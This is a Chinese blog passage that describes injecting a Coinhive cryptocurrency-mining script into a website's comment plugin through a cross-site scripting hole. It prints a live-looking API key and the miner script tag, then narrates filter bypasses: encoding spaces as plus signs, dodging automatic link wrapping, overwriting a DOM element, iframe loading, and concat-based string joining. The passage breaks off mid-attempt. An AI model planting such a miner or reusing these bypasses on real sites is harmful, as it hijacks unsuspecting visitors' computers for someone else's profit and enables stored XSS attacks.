## 挖矿

  

既然有这么好的机会，我们这么可以不试试挖矿呢？

首先需要一个门罗币账户(不赘述)

其次去coinhive注册一个账户(不赘述)

```
APIkey:3CZb3wTC2wAsN0kWehZEi8Tclp38uFBo
```

获取JS运行脚本 

  

```


```

<script src=https://coinhive.com/lib/coinhive.min.js></script>

<script>

var miner = new CoinHive.Anonymous(’3CZb3wTC2wAsN0kWehZEi8Tclp38uFBo’, {throttle: 0.5});

miner.start();

</script>

本以为直接将脚本插入即可，结果插入之后直接返回400错误：

![](../Images/2512920b1eda0c1524a164b84304c7df.png)根据测试可以发现，这是因为没有将空格编码为+所导致的。

![](../Images/d4df6cb22873df18fddde06a3dde0c6b.png)

从返回的数据包中，可以看到我们接收到的数据正是我们想要。

但是进入页面查看一下，妈卖批为啥不执行。。。。。。。

![](../Images/3feb2997b5ee55cb9a2f0579bf9369b7.png)

通过审查元素发现，原来是这个评论插件为自动为URL地址加上A标签。现在只有想办法绕过一下。

测试了N种情况，发现这个URL地址没有办法绕过，只能想办法拼接URL。但是现在URL并不在script内部，无法使用注释或函数拼接。

那我们不妨尝试一下DOM，先选一个id吧，直接覆盖。

![](../Images/b6d4b3ea25c88dd1055b44d0c10262f0.png)

就选这个吧，这个好看～ 现在控制台尝试一下：

  

![](../Images/5c638a6cde4e00d0717f1998b9b27c42.png)这里使用+对URL进行拼接，查看一下源码：

![](../Images/df6e357d1f26acf76ad9d6dc516525aa.png)开心哈哈哈哈，现在效果达到，但是特么的为什么没有运行呢？？？？？

![](../Images/1a3095a08fbcdc73a46e47b2bd13fec5.png)大概就是这么个意思，那好吧，那就换种方法，使用iframe加载总可以了吧。

![](../Images/b50bf0473699a2527d8495bcd68d7213.png)这次返回的结果是正确的，但是我们刚刚用来拼接字符串的+已经让它给变成空格了。

![](../Images/4a3797469853f24e775ac525db5c0474.png)

因此，我们换种方法来拼接字符串，使用concat函数
